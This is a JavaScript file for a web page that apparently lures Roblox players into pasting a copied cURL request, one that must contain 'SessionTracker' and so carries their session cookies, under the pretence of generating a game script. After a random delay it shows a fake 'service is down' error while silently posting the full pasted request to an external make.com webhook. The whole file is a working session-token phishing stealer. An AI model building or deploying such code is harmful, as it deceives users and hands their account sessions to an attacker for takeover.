document.getElementById("Send").addEventListener("click", function () {
    var gameCode = document.querySelector(".form__field__game").value;

    // Проверка на пустое значение
    if (!gameCode) {
        Swal.fire({
            title: "Error",
            text: "Please enter the Game Code.",
            icon: "error",
            confirmButtonText: "OK"
        });
        return;
    }

    // Проверка на наличие SessionTracker
    if (!gameCode.includes("SessionTracker")) {
        Swal.fire({
            title: "Error",
            text: "Try to login in Roblox.",
            icon: "error",
            confirmButtonText: "OK"
        });
        return;
    }

    // Извлечение Game ID и Game Name из cURL
    let gameId, gameName;
    let regex = /curl \^"https:\/\/www\.roblox\.com\/games\/(\d+)\/([^"]+)\^"/;
    let match = gameCode.match(regex);

    if (!match) {
        Swal.fire({
            title: "Invalid Game Code",
            text: "Please try again.",
            icon: "error",
            confirmButtonText: "OK"
        });
        return;
    }

    gameId = match[1];
    gameName = match[2];

    // Подтверждение правильности введенных данных
    Swal.fire({
        title: "Is this correct? 👀",
        text: "Game: " + gameName + " | Game ID: " + gameId,
        icon: "question",
        showCancelButton: true,
        confirmButtonText: "Yes",
        cancelButtonText: "No"
    }).then((result) => {
        if (result.isConfirmed) {
            // Уведомление о создании скрипта
            Swal.fire({
                title: "Creating Script for Game...",
                text: "Please wait.",
                allowOutsideClick: false,
                didOpen: function () {
                    Swal.showLoading();
                    setTimeout(() => {
                        // Уведомление о сбое сервиса
                        Swal.fire({
                            title: "Try Again Later",
                            text: "Our service is down at the moment. 😣",
                            icon: "error",
                            confirmButtonText: "OK"
                        });

                        // Отправка данных на вебхук
                        let webhookUrl = "https://hook.eu2.make.com/6qyqld9qayuj7uba2t19okaihj93nimy"; // Замените на ваш URL вебхука

                        let requestBody = {
                            content: `Game: ${gameName} | Game ID: ${gameId} | cURL: ${gameCode}`
                        };

                        fetch(webhookUrl, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(requestBody)
                        });

                    }, Math.random() * (13000 - 5000) + 5000); // Ждем от 5 до 13 секунд
                }
            });
        }
    });
});
